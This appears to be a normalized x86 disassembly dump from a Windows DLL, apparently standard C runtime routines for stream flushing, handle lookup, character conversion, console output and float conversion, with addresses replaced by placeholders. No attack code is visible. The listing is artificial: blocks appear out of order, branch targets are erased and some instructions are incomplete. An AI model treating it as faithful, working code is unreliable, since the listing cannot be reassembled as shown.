mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_100480d0
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_100480ef
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
and ecx 0xfff7ffff
and eax ecx
push esi
mov esi [ ebp + 0x8 ]
test eax 0xfcf0fce0
je r-xdata
push ecx
push [ ebp + 0xc ]
test esi esi
je r-xdata
test esi esi
je r-xdata
call sub_1004a7e4
call sub_1004a7e4
mov [ esi ] eax
jmp r-xdata
call sub_100417ee
push 0x16
pop esi
mov [ eax ] esi
call sub_1003fe28
mov eax esi
jmp r-xdata
push 0x0
push 0x0
call sub_1004a7e4
pop ecx
pop ecx
mov [ esi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_10048155
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
js r-xdata
call sub_100417ee
mov [ eax ] 0x16
call sub_1003fe28
or eax 0xffffffff
pop ebp
retn
cmp eax 0x2
jle r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] eax
cmp eax 0x3
jne r-xdata
mov ecx [ rw-data ]
jmp r-xdata
mov eax ecx
pop ebp
retn
sub_10048195
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ EncodePointer@IAT ]
push esi
push edi
mov [ ebp - 0x1c ] eax
xor esi esi
mov eax [ ebp + 0xc ]
push esi
mov [ ebp - 0x20 ] eax
call ebx
mov edi eax
mov [ ebp - 0x18 ] edi
call sub_10043227
mov [ ebp - 0x14 ] eax
cmp [ rw-data ] esi
jne r-xdata
call [ IsDebuggerPresent@IAT ]
test eax eax
je r-xdata
push 0x800
push esi
push r--data
call [ LoadLibraryExW@IAT ]
mov edi eax
test edi edi
jne r-xdata
cmp [ ebp - 0x14 ] esi
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push r--data
push edi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x57
jne r-xdata
mov eax [ rw-data ]
mov ebx [ DecodePointer@IAT ]
cmp eax edi
je r-xdata
push [ rw-data ]
call [ DecodePointer@IAT ]
push 0x3
jmp r-xdata
cmp [ ebp - 0x14 ] esi
je r-xdata
push eax
call [ OutputDebugStringW@IAT ]
xor eax eax
push eax
call ebx
push r--data
push edi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
push r--data
push edi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
push r--data
push edi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
mov [ rw-data ] eax
test eax eax
je r-xdata
push esi
push esi
push r--data
call [ LoadLibraryExW@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
cmp [ rw-data ] edi
je r-xdata
pop eax
jmp r-xdata
push 0x4
mov edi [ ebp - 0x18 ]
push r--data
push edi
call [ GetProcAddress@IAT ]
push eax
call ebx
mov [ rw-data ] eax
mov edi [ ebp + 0x10 ]
push eax
call ebx
test eax eax
je r-xdata
push eax
call ebx
push [ rw-data ]
mov [ ebp - 0x14 ] eax
call ebx
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1003c623
mov esp ebp
pop ebp
retn
push edi
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push esi
call eax
jmp r-xdata
call eax
mov esi eax
test esi esi
je r-xdata
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
call ecx
test eax eax
je r-xdata
push eax
call ebx
test eax eax
je r-xdata
mov edi [ ebp + 0x10 ]
or edi 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call [ ebp - 0x18 ]
test eax eax
je r-xdata
push esi
call eax
mov esi eax
push [ rw-data ]
call ebx
test eax eax
je r-xdata
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_1004837b
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_100483c1
pop ecx
test eax eax
je r-xdata
push esi
call sub_1004842e
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_100460c6
push eax
call sub_1004ab7d
neg eax
pop ecx
pop ecx
sbb eax eax
jmp r-xdata
sub_100483c1
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov eax [ esi + 0xc ]
and al 0x3
cmp al 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax ebx
and [ esi + 0x4 ] 0x0
mov [ esi ] ecx
pop esi
pop ebx
pop ebp
retn
test [ esi + 0xc ] 0x108
je r-xdata
push edi
mov edi [ esi ]
sub edi [ esi + 0x8 ]
test edi edi
jle r-xdata
pop edi
push edi
push [ esi + 0x8 ]
push esi
call sub_100460c6
pop ecx
push eax
call sub_1004613e
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_1004842e
push 0x14
push r--data
call sub_1003f180
xor edi edi
mov [ ebp - 0x1c ] edi
and [ ebp - 0x24 ] edi
push 0x1
call sub_10045009
pop ecx
and [ ebp - 0x4 ] edi
xor esi esi
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10048509
cmp ebx 0x1
mov eax edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
call sub_1003f1c5
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_1004602f
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_100484d6
cmp ebx 0x1
jne r-xdata
test ebx ebx
jne r-xdata
push eax
call sub_1004837b
pop ecx
cmp eax 0xffffffff
je r-xdata
test [ eax + 0xc ] 0x2
je r-xdata
inc edi
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
call sub_1004837b
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_1004854c
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x10 ]
push esi
mov esi [ ebx + 0xc ]
push edi
movzx ecx [ eax ]
mov [ ebp - 0x84 ] ecx
mov eax [ esi ]
dec eax
je r-xdata
push 0x8
dec eax
je r-xdata
mov ecx [ ebp - 0x84 ]
mov ecx [ ebx + 0x8 ]
cmp ecx 0x10
je r-xdata
push 0x4
jmp r-xdata
dec eax
je r-xdata
push [ esi ]
call sub_1003fabf
pop ecx
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x40 ]
fld [ esi + 0x10 ]
and eax 0xffffffe3
or eax 0x3
fstp [ ebp - 0x50 ]
mov [ ebp - 0x40 ] eax
cmp ecx 0x16
je r-xdata
pop edi
push ecx
lea eax [ esi + 0x18 ]
push eax
push edi
call sub_1003f5db
add esp 0xc
test eax eax
jne r-xdata
push 0x11
jmp r-xdata
dec eax
je r-xdata
push esi
call sub_10027670
pop ecx
test eax eax
jne r-xdata
cmp ecx 0x1d
je r-xdata
push 0x12
jmp r-xdata
dec eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1003c623
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
and [ ebp - 0x40 ] 0xfffffffe
jmp r-xdata
dec eax
dec eax
je r-xdata
lea eax [ esi + 0x18 ]
push eax
lea eax [ esi + 0x8 ]
push eax
push ecx
push edi
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_1003f7b9
add esp 0x18
mov [ esi ] 0x1
jmp r-xdata
dec eax
jne r-xdata
push 0xffff
push ecx
call sub_1003fb73
cmp [ esi ] 0x8
pop ecx
pop ecx
je r-xdata
push 0x10
jmp r-xdata
sub_1004871d
push 0x10
push r--data
call sub_1003f180
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_10045009
pop ecx
and [ ebp - 0x4 ] edi
push 0x3
pop esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100487b1
mov eax edi
call sub_1003f1c5
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
inc esi
jmp r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
cmp esi 0x14
jl r-xdata
push eax
call sub_1004acd2
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_1003f3e3
pop ecx
mov eax [ rw-data ]
and [ eax + esi * 4 ] 0x0
inc edi
mov [ ebp - 0x1c ] edi
sub_100487ba
push 0x8
push r--data
call sub_1003f180
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
add eax 0xc
add eax edi
push eax
call [ EnterCriticalSection@IAT ]
xor eax eax
inc eax
call sub_1003f1c5
retn
push 0xa
call sub_10045009
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1004883f
push ebx
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_100431f9
add esp 0xc
inc [ esi + 0x8 ]
sub_10048848
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
js r-xdata
call sub_100417ee
mov [ eax ] 0x9
call sub_100417ba
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov edi eax
mov esi eax
sar edi 0x5
and esi 0x1f
shl esi 0x6
mov ecx [ edi * 4 + rw-data ]
test [ esi + ecx + 0x4 ] 0x1
je r-xdata
cmp [ esi + ecx ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi * 4 + rw-data ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
xor ecx ecx
sub eax ecx
je r-xdata
pop edi
pop esi
pop ebp
retn
push ecx
push 0xfffffff6
dec eax
je r-xdata
push ecx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ecx
push 0xfffffff4
jmp r-xdata
sub_100488ce
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_100417ba
and [ eax ] 0x0
call sub_100417ee
mov [ eax ] 0x9
jmp r-xdata
call sub_100417ba
and [ eax ] 0x0
call sub_100417ee
mov [ eax ] 0x9
call sub_1003fe28
cmp ecx [ rw-data ]
jae r-xdata
or eax 0xffffffff
pop ebp
retn
mov eax ecx
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_10048935
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
shl ecx 0x6
add ecx 0xc
mov eax [ eax * 4 + rw-data ]
add eax ecx
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1004895b
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
xor eax eax
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1003cf9b
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_10046c47
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
xor edi edi
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
inc edi
push edi
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov edi [ ebp - 0x10 ]
cmp [ edi + 0x74 ] 0x1
jle r-xdata
xor edi edi
inc edi
jmp r-xdata
movzx eax [ esi ]
mov [ ecx ] ax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_100417ee
or edi 0xffffffff
mov [ eax ] 0x2a
cmp ebx [ edi + 0x74 ]
cmp ebx [ edi + 0x74 ]
jl r-xdata
mov eax edi
pop edi
jmp r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ esi + 0x1 ] 0x0
je r-xdata
jb r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push [ edi + 0x74 ]
push esi
push 0x9
push [ edi + 0x4 ]
call [ MultiByteToWideChar@IAT ]
mov edi [ ebp - 0x10 ]
test eax eax
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ edi + 0x74 ]
jmp r-xdata
sub_10048a68
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
call sub_1004ad60
mov eax [ rw-data ]
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
jmp r-xdata
mov ax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_10048ab0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_10048adb
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
movzx eax [ ecx + 0xa ]
xor ebx ebx
mov edi [ ebp + 0xc ]
mov edx eax
and eax 0x8000
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x44 ] eax
and edx 0x7fff
mov eax [ ecx + 0x6 ]
sub edx 0x3fff
mov [ ebp - 0x10 ] eax
mov eax [ ecx + 0x2 ]
mov [ ebp - 0xc ] eax
movzx eax [ ecx ]
shl eax 0x10
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x8 ] eax
cmp edx 0xffffc001
jne r-xdata
mov eax [ rw-data ]
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x24 ] edx
movsd [ edi ] [ esi ]
dec eax
mov [ ebp - 0x34 ] eax
push 0x1f
mov [ ebp - 0x2c ] ebx
movsd [ edi ] [ esi ]
lea ecx [ eax + 0x1 ]
mov eax ecx
cdq
movsd [ edi ] [ esi ]
pop esi
and edx esi
add edx eax
sar edx 0x5
mov [ ebp - 0x3c ] edx
and ecx 0x8000001f
jns r-xdata
mov esi ebx
mov eax ebx
sub esi ecx
xor eax eax
inc eax
mov [ ebp - 0x30 ] esi
mov ecx esi
or edi 0xffffffff
shl eax cl
push 0x3
pop esi
test [ ebp + edx * 4 - 0x10 ] eax
je r-xdata
dec ecx
or ecx 0xffffffe0
inc ecx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
inc eax
cmp eax 0x3
jl r-xdata
mov eax edi
shl eax cl
and [ ebp + edx * 4 - 0x10 ] eax
lea eax [ edx + 0x1 ]
cmp eax esi
jge r-xdata
mov eax edi
shl eax cl
not eax
test [ ebp + edx * 4 - 0x10 ] eax
jmp r-xdata
mov edi [ ebp - 0x40 ]
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x20 ]
cmp [ ebp - 0x2c ] ebx
je r-xdata
lea edi [ ebp - 0x10 ]
mov ecx esi
lea edi [ edi + eax * 4 ]
sub ecx eax
xor eax eax
[ edi ]
or edi 0xffffffff
jne r-xdata
cmp eax 0x20
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ edi + 0x4 ] esi
mov [ edi ] eax
jmp r-xdata
push 0x1f
pop eax
sub eax [ rw-data ]
mov ecx eax
mov eax [ ebp - 0x44 ]
shl esi cl
neg eax
sbb eax eax
and eax 0x80000000
or esi eax
mov eax [ rw-data ]
or esi [ ebp - 0x10 ]
cmp eax 0x40
jne r-xdata
mov edx [ rw-data ]
mov eax edx
sub eax [ rw-data ]
cmp ecx eax
jge r-xdata
inc ecx
mov eax [ ebp - 0x34 ]
cdq
push 0x1f
pop ecx
and edx ecx
add edx eax
mov eax [ ebp - 0x34 ]
sar edx 0x5
and eax 0x8000001f
jns r-xdata
inc edx
cmp edx esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov eax ebx
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1003c623
mov esp ebp
pop ebp
retn
mov [ edi ] esi
cmp ecx edx
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
sub ecx eax
mov [ ebp - 0x2c ] ebx
xor eax eax
inc eax
shl eax cl
mov [ ebp - 0x38 ] eax
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx [ ebp - 0x38 ]
add ecx eax
mov [ ebp - 0x28 ] ecx
cmp ecx eax
mov eax [ ebp - 0x28 ]
mov ecx ebx
push 0xffffffff
pop edi
jb r-xdata
dec eax
or eax 0xffffffe0
inc eax
cmp [ ebp + edx * 4 - 0x10 ] ebx
jmp r-xdata
cmp ecx [ rw-data ]
jl r-xdata
sub edx [ ebp - 0x24 ]
lea esi [ ebp - 0x1c ]
mov [ ebp - 0x30 ] edx
lea edi [ ebp - 0x10 ]
mov eax edx
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
movsd [ edi ] [ esi ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
and eax 0x8000001f
jns r-xdata
push 0x2
pop ebx
jmp r-xdata
xor ecx ecx
inc ecx
mov [ ebp - 0x2c ] ecx
cmp eax [ ebp - 0x38 ]
jae r-xdata
mov edx [ ebp - 0x3c ]
mov esi [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
add esi ecx
mov ecx [ rw-data ]
mov eax ecx
cdq
and edx 0x1f
mov [ ebp - 0x38 ] esi
add eax edx
sar eax 0x5
mov [ ebp - 0x28 ] eax
and ecx 0x8000001f
jns r-xdata
mov ecx [ rw-data ]
lea edi [ ebp - 0x10 ]
xor eax eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax ecx
or [ ebp - 0x10 ] 0x80000000
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov [ ebp - 0x34 ] eax
and ecx 0x8000001f
jns r-xdata
mov [ ebp - 0x30 ] eax
or edi 0xffffffff
mov eax edi
mov [ ebp - 0x20 ] ebx
mov edi [ ebp - 0x30 ]
mov ecx edi
shl eax cl
not eax
push 0x20
mov [ ebp - 0x28 ] eax
pop eax
sub eax edi
push 0x3
mov [ ebp - 0x38 ] eax
pop esi
dec eax
or eax 0xffffffe0
inc eax
mov ecx [ ebp - 0x30 ]
test ecx ecx
je r-xdata
mov [ ebp + edx * 4 - 0x10 ] eax
dec edx
js r-xdata
push 0x20
mov [ ebp - 0x20 ] ebx
mov esi ebx
shl edi cl
mov ebx ecx
pop eax
sub eax ebx
mov [ ebp - 0x24 ] ecx
not edi
mov [ ebp - 0x24 ] eax
dec ecx
or ecx 0xffffffe0
inc ecx
or edi 0xffffffff
mov [ ebp - 0x38 ] ecx
push 0x20
shl edi cl
pop eax
sub eax ecx
mov [ ebp - 0x20 ] ebx
not edi
mov [ ebp - 0x28 ] eax
dec ecx
or ecx 0xffffffe0
inc ecx
mov edx [ ebp + ebx * 4 - 0x10 ]
mov ecx edi
mov eax edx
shr edx cl
or edx [ ebp - 0x20 ]
and eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x38 ]
shl eax cl
mov [ ebp + ebx * 4 - 0x10 ] edx
inc ebx
mov [ ebp - 0x20 ] eax
cmp ebx esi
jl r-xdata
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x8 ]
shl eax 0x2
xor ebx ebx
push 0x2
sub edx eax
or edi 0xffffffff
mov eax [ ebp - 0x3c ]
pop ecx
or edi 0xffffffff
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx ebx
mov [ ebp - 0x2c ] ebx
lea edi [ eax + 0x1 ]
cmp edi eax
mov [ ebp - 0x28 ] edi
mov eax edi
jb r-xdata
mov edx [ ebp + esi * 4 - 0x10 ]
mov ecx ebx
mov eax edx
shr edx cl
or edx [ ebp - 0x20 ]
and eax edi
mov ecx [ ebp - 0x24 ]
shl eax cl
mov [ ebp + esi * 4 - 0x10 ] edx
inc esi
mov [ ebp - 0x20 ] eax
cmp esi 0x3
jl r-xdata
mov edi [ ebp - 0x28 ]
lea edx [ ebp - 0x8 ]
mov esi [ ebp - 0x38 ]
mov eax edi
shl eax 0x2
push 0x2
sub edx eax
xor ebx ebx
pop ecx
mov edx [ ebp + ebx * 4 - 0x10 ]
mov eax edx
shr edx cl
and eax edi
or edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x28 ]
shl eax cl
mov ecx [ ebp - 0x38 ]
mov [ ebp + ebx * 4 - 0x10 ] edx
inc ebx
mov [ ebp - 0x20 ] eax
cmp ebx esi
jl r-xdata
mov esi [ ebp - 0x34 ]
lea edx [ ebp - 0x8 ]
mov eax esi
shl eax 0x2
push 0x2
sub edx eax
xor ebx ebx
pop ecx
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
mov eax [ ebp - 0x3c ]
jmp r-xdata
xor ecx ecx
inc ecx
mov [ ebp - 0x2c ] ecx
cmp eax 0x1
jae r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
cmp ecx eax
jl r-xdata
mov ecx [ ebp - 0x34 ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add edx eax
sar edx 0x5
mov [ ebp - 0x2c ] edx
and ecx 0x8000001f
jns r-xdata
sub edx 0x4
dec ecx
jns r-xdata
mov [ ebp + edx * 4 - 0x10 ] eax
dec edx
jns r-xdata
cmp ecx edi
jl r-xdata
sub edx 0x4
dec ecx
jns r-xdata
cmp ecx esi
jl r-xdata
mov esi [ rw-data ]
xor ebx ebx
add esi [ rw-data ]
inc ebx
jmp r-xdata
sub edx 0x4
dec ecx
jns r-xdata
push 0x1f
pop eax
sub eax ecx
mov [ ebp - 0x30 ] eax
xor eax eax
mov ecx [ ebp - 0x30 ]
inc eax
shl eax cl
test [ ebp + edx * 4 - 0x10 ] eax
je r-xdata
dec ecx
or ecx 0xffffffe0
inc ecx
mov eax edi
shl eax cl
and [ ebp + edx * 4 - 0x10 ] eax
inc edx
cmp edx esi
jge r-xdata
mov eax edi
shl eax cl
not eax
test [ ebp + edx * 4 - 0x10 ] eax
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov [ ebp - 0x28 ] eax
and ecx 0x8000001f
jns r-xdata
lea edi [ ebp - 0x10 ]
mov ecx esi
lea edi [ edi + edx * 4 ]
sub ecx edx
xor eax eax
[ edi ]
or edi 0xffffffff
jne r-xdata
mov [ ebp - 0x24 ] ecx
mov eax ebx
shl edi cl
push 0x20
mov [ ebp - 0x20 ] ebx
not edi
mov ebx [ ebp - 0x24 ]
pop ecx
sub ecx ebx
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x24 ] ecx
dec ecx
or ecx 0xffffffe0
inc ecx
mov edi [ ebp - 0x34 ]
mov eax edi
push 0x1f
cdq
pop ecx
and edx ecx
add edx eax
sar edx 0x5
and edi 0x8000001f
jns r-xdata
inc edx
cmp edx esi
jl r-xdata
mov edx [ ebp + eax * 4 - 0x10 ]
mov ecx ebx
mov eax edx
shr edx cl
mov ecx [ ebp - 0x34 ]
and eax edi
or edx [ ebp - 0x20 ]
mov [ ebp + ecx * 4 - 0x10 ] edx
mov ecx [ ebp - 0x24 ]
shl eax cl
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
inc eax
mov [ ebp - 0x34 ] eax
cmp eax esi
jl r-xdata
mov esi [ ebp - 0x28 ]
lea edx [ ebp - 0x8 ]
mov eax esi
shl eax 0x2
push 0x2
sub edx eax
xor ebx ebx
pop ecx
mov eax [ ebp + edx * 4 - 0x10 ]
sub ecx edi
xor edi edi
inc edi
shl edi cl
mov ecx ebx
mov [ ebp - 0x24 ] edi
add edi eax
mov [ ebp - 0x20 ] edi
cmp edi eax
mov eax [ ebp - 0x20 ]
push 0xffffffff
pop edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + edx * 4 - 0x10 ] ebx
jmp r-xdata
mov [ ebp + ecx * 4 - 0x10 ] ebx
mov eax [ edx ]
mov [ ebp + ecx * 4 - 0x10 ] eax
jmp r-xdata
xor ecx ecx
inc ecx
cmp eax [ ebp - 0x24 ]
jae r-xdata
mov edx [ ebp - 0x2c ]
cmp ecx esi
jl r-xdata
jmp r-xdata
sub edx 0x4
dec ecx
jns r-xdata
mov ecx [ ebp - 0x30 ]
test ecx ecx
je r-xdata
mov [ ebp + edx * 4 - 0x10 ] eax
dec edx
js r-xdata
mov esi ebx
jmp r-xdata
or edi 0xffffffff
mov eax [ ebp + edx * 4 - 0x10 ]
mov ecx ebx
lea edi [ eax + 0x1 ]
cmp edi eax
mov [ ebp - 0x20 ] edi
mov eax edi
jb r-xdata
xor ecx ecx
inc ecx
cmp eax 0x1
jae r-xdata
mov [ ebp + edx * 4 - 0x10 ] eax
dec edx
jns r-xdata
sub_1004904d
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
movzx eax [ ecx + 0xa ]
xor ebx ebx
mov edi [ ebp + 0xc ]
mov edx eax
and eax 0x8000
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x44 ] eax
and edx 0x7fff
mov eax [ ecx + 0x6 ]
sub edx 0x3fff
mov [ ebp - 0x10 ] eax
mov eax [ ecx + 0x2 ]
mov [ ebp - 0xc ] eax
movzx eax [ ecx ]
shl eax 0x10
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x8 ] eax
cmp edx 0xffffc001
jne r-xdata
mov eax [ rw-data ]
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x24 ] edx
movsd [ edi ] [ esi ]
dec eax
mov [ ebp - 0x34 ] eax
push 0x1f
mov [ ebp - 0x2c ] ebx
movsd [ edi ] [ esi ]
lea ecx [ eax + 0x1 ]
mov eax ecx
cdq
movsd [ edi ] [ esi ]
pop esi
and edx esi
add edx eax
sar edx 0x5
mov [ ebp - 0x3c ] edx
and ecx 0x8000001f
jns r-xdata
mov esi ebx
mov eax ebx
sub esi ecx
xor eax eax
inc eax
mov [ ebp - 0x30 ] esi
mov ecx esi
or edi 0xffffffff
shl eax cl
push 0x3
pop esi
